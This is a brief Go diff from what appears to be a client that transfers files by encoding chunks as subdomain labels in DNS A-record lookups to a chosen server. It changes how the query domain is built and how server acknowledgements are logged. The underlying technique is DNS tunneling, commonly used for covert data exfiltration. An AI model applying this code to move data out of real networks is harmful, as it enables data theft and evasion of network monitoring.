@@ -63,17 +63,17 @@ Example:
 			Info("Making DNS requests to transfer file")
 
 		for _, r := range requests {
-			response := dnsclient.Lookup(dnsProvider, fmt.Sprintf(dnsDomain, r), dns.TypeA)
+			//response := dnsclient.Lookup(dnsProvider, fmt.Sprintf(dnsDomain, r), dns.TypeA)
+			response := dnsclient.Lookup(dnsProvider, fmt.Sprintf("%s.%s", r, dnsDomain), dns.TypeA)
 
-			if response.Data == successFlag {
-				log.WithFields(log.Fields{
-					"file":     sendCmdFileName,
-					"size":     fileSize,
-					"requests": len(requests),
-					"response": response.Data,
-				}).Info("Server successfully acked")
+			log.WithFields(log.Fields{
+				"file":     sendCmdFileName,
+				"size":     fileSize,
+				"requests": len(requests),
+				"response": response.Data,
+			}).Info("Server response")
 
-			} else {
+			if response.Data != successFlag {
 				fmt.Println("Server did not respond with a successful ack. Exiting.")
 				return
 			}
